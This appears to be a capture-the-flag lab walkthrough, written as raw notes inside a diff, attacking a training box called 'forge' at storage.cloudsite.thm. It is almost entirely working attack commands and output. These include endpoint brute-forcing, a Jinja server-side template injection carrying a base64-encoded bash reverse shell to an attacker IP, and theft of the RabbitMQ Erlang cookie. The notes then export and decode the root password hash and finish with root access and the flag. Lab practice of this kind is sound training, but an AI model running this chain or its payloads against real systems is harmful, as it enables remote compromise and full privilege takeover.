@@ -1,0 +1,176 @@
+gobuster dir --url http://storage.cloudsite.thm/api -w /usr/share/wordlists/dirb/common.txt 
+
+
+
+
+
+/api/uploads/b567728c-fefa-420c-bb44-bfb4e15430f0
+
+
+
+
+
+
+
+Success: File stored from URL successfully
+
+File path: /api/uploads/7f03b5f1-891d-4b2c-a88a-ae92e6d45109
+
+
+
+http://storage.cloudsite.thm:3000/api/docs
+
+
+
+
+
+
+
+
+
+HTTP/1.1 200 OK
+
+Date: Wed, 30 Jul 2025 01:56:56 GMT
+
+Server: Apache/2.4.52 (Ubuntu)
+
+X-Powered-By: Express
+
+Accept-Ranges: bytes
+
+Cache-Control: public, max-age=0
+
+Last-Modified: Wed, 30 Jul 2025 01:55:22 GMT
+
+ETag: W/"233-198590a9694"
+
+Content-Type: application/octet-stream
+
+Content-Length: 563
+
+Keep-Alive: timeout=5, max=100
+
+Connection: Keep-Alive
+
+
+
+Endpoints Perfectly Completed
+
+POST Requests:
+/api/register - For registering user
+/api/login - For loggin in the user
+/api/upload - For uploading files
+/api/store-url - For uploadion files via url
+/api/fetch_messeges_from_chatbot - Currently, the chatbot is under development. Once development is complete, it will be used in the future.
+
+GET Requests:
+/api/uploads/filename - To view the uploaded files
+/dashboard/inactive - Dashboard for inactive user
+/dashboard/active - Dashboard for active user
+
+Note: All requests to this endpoint are sent in JSON format.
+
+
+
+
+
+
+curl -x GET -H "Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3QxQHRlc3QuY29tIiwic3Vic2NyaXB0aW9uIjoiYWN0aXZlIiwiaWF0IjoxNzUzODM4ODgxLCJleHAiOjE3NTM4NDI0ODF9.5bZIKr5NFAtvQ18txhPXdRI3ouGVCZaIRX93pQ2peNE"  -v  http://storage.cloudsite.thm/api/fetch_messeges_from_chatbot 
+
+curl http://storage.cloudsite.thm/api/fetch_messeges_from_chatbot "cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3QxQHRlc3QuY29tIiwic3Vic2NyaXB0aW9uIjoiYWN0aXZlIiwiaWF0IjoxNzUzODM4ODgxLCJleHAiOjE3NTM4NDI0ODF9.5bZIKr5NFAtvQ18txhPXdRI3ouGVCZaIRX93pQ2peNE"
+
+
+
+Content-Type: application/json
+Content-Length: 0
+{"username":"test"}
+
+
+
+
+
+
+Now all we need to do is create a bash one liner, base64 encode it, and then put out payload within the SSTI RCE, send the Request and our netcat session will connect
+
+Bash one-liner
+
+bash -i >& /dev/tcp/<Kali IP>/<port> 0>&1
+
+echo 'bash -i >& /dev/tcp/10.8.163.249/1234 0>&1' | base64
+
+
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjE2My4yNDkvMTIzNCAwPiYxCg==
+
+
+
+
+
+Command to run to encode it
+
+echo 'bash -i >& /dev/tcp/<Kali IP>/<port> 0>&1' | base64
+Payload to put in the place of the test username/payload we used above to confirm the SSTI
+
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo <base64 output> |base64 -d |bash').read() }}
+Connected netcat session
+
+
+
+
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjE2My4yNDkvMTIzNCAwPiYxCg== |base64 -d |bash').read() }}
+
+
+
+curl -X POST http://storage.cloudsite.thm/api/fetch_messeges_from_chatbot -H "Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3QxQHRlc3QuY29tIiwic3Vic2NyaXB0aW9uIjoiYWN0aXZlIiwiaWF0IjoxNzUzODQyNDU5LCJleHAiOjE3NTM4NDYwNTl9.q0PAEcx771d2jLgzbjY1dVUMdgDbadhv4YOOPAaXiaU" -H "Content-Type: application/json"  --data "{\"username\":\"{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjE2My4yNDkvMTIzNCAwPiYxCg== |base64 -d |bash').read() }}\"}"
+
+
+
+
+python3 -c "import pty;pty.spawn("/bin/bash")"
+
+
+
+azrael@forge:/var/lib/rabbitmq$ find / -type f -name *erlang* 2>&1 | grep -v 'Permission denied'ca: command not found
+
+
+cat: command not found
+azrael@forge:/var/lib/rabbitmq$ cat .erlang.cookie 
+OSdMlUKLVbCRvFCU
+azrael@forge:/var/lib/rabbitmq$ 
+
+
+sudo rabbitmqctl --erlang-cookie 'OSdMlUKLVbCRvFCU' --node rabbit@forge list_users
+
+
+sudo rabbitmqctl --erlang-cookie 'OSdMlUKLVbCRvFCU' --node rabbit@forge export_definitions /tmp/conf.json
+
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ cat /tmp/conf.json 
+{"permissions":[{"configure":".*","read":".*","user":"root","vhost":"/","write":".*"}],"bindings":[],"queues":[{"arguments":{},"auto_delete":false,"durable":true,"name":"tasks","type":"classic","vhost":"/"}],"parameters":[],"policies":[],"rabbitmq_version":"3.9.13","exchanges":[],"global_parameters":[{"name":"cluster_name","value":"rabbit@forge"}],"rabbit_version":"3.9.13","topic_permissions":[{"exchange":"","read":".*","user":"root","vhost":"/","write":".*"}],"users":[{"hashing_algorithm":"rabbit_password_hashing_sha256","limits":{},"name":"The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256.","password_hash":"vyf4qvKLpShONYgEiNc6xT/5rLq+23A2RuuhEZ8N10kyN34K","tags":[]},{"hashing_algorithm":"rabbit_password_hashing_sha256","limits":{},"name":"root","password_hash":"49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF","tags":["administrator"]}],"vhosts":[{"limits":[],"metadata":{"description":"Default virtual host","tags":[]},"name":"/"}]}                                                                                                                       
+┌──(kali㉿kali)-[~/Downloads]
+└─$ 
+
+
+
+
+echo -n 49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF | base64 -d | xxd -p -c 100
+
+
+──(kali㉿kali)-[~/Downloads]
+└─$ echo -n 49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF | base64 -d | xxd -p -c 100
+
+e3d7ba85295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585
+                                                                                                                       
+┌──(kali㉿kali)-[~/Downloads]
+└─$ 
+
+
+
+
+azrael@forge:/var/lib/rabbitmq$ su - root
+Password: 295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585
+root@forge:~# ls
+forge_web_service  root.txt  snap
+root@forge:~# cat root.txt 
+eabf7a0b05d3f2028f3e0465d2fd0852
+root@forge:~# 
